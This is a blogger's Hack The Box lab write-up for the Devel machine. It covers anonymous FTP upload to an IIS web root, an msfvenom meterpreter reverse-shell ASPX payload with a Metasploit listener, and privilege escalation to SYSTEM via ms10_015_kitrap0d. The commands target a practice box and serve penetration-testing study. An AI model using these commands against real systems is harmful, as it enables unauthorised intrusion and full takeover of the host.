### HTB Devel Write up

So I got into studying for my PNPT (as evidenced by notes in another repo of mine) and it brought me back to HTB.  So here we go, yea!  Sorry no screen shots for this one, tried recording it and the pic quality isn't the greatest.  Will be more next time, I promise.

First up, Devel box.  Quick peek into guided mode and we see a number of questions.

Stared up the box and got my VPN set back up and everything going on my Kali.

First command, as always, nmap!
```
sudo nmap -sV 10.10.10.5
```
This gave me the answer to the first question.  Along with ftp on 21, it's also running an http server on 80.  Quick browse to that and it's a simple webpage that hasn't been set up, just 'turned on' if you will.

Also check ftp and it looks like it's able to be logged in with anonymous, pretty handy.
```
ftp 10.10.10.5
anonymous
<make up some password>
```

And you're in.  You can see that in the directory the ftp points to, you get the same files that look like they would be in a root directory for an IIS instance (funny, that's what we found earlier).  I wonder if this is the same directory.  Create a file and use ftp to upload said file and see if you can access it.
```
put yourfile.txt yourfile.txt
```

Then open the browser and navigate to that page and you should see the text you put into the file.  Success!!  You should see the text that you put into the file.

Now that we know we can upload files to the server, we can use msfvenom to write a payload like this:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx > devel.aspx 
```
Here I used 'tun0' since that was my VPN tunnel but you can use whatever interface you need to or you can set it to your ip, be it your VPN ip or however you are connecting.  Make sure you note the port too.

Once that completes you should have a file kicked out named 'devel.aspx'.  Use the ftp connection we established (reconnect if you need to) and upload that file to the devel box.

Once that is done, you'll want to open a meterpreter listener.
```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
exploit
```

Once that is running, go back to the webpage and load the devel.aspx file and that should create your connection.  Important here, make sure you set your payload.  I went around and around with this and realized I never set my payload and that's why it would not work for me.  Don't be a dunce like me, set your payloads peeps!!

Now that we're all happy and goo....wait, we're not all happy and good?  Oh, we're the IIS default user....with no real priviledges.  Hmm....

So we background that session and search metasploit again.  This time we search with the local_exploit_suggester module.  I've read this is reliable with x86 architecture, not so much x64.  Since we know we're on x86, this is fine.  We find a number of options, the one we're looking for is `ms10_015_kitrap0d`.

```
use exploit/windows/local/ms10_015_kitrap0d
set payload windows/meterpreter/reverse_tcp
set session 1
exploit
```

Again, I'm going to always set my payloads now.  And the session ID is the session you have running currently.  Once this runs, I was able to get in and getuid return NT AUTHORITY\SYSTEM.

Once you get that, you can grab your flags and be on your merry way.

### Lessons learned

First, don't rely on OBS studio screen recorder to get very great resolution.  Second, always set payloads cause the default may not be what you are needing it to be.  Third, don't let it be so long between these things!!  Until next time kids!
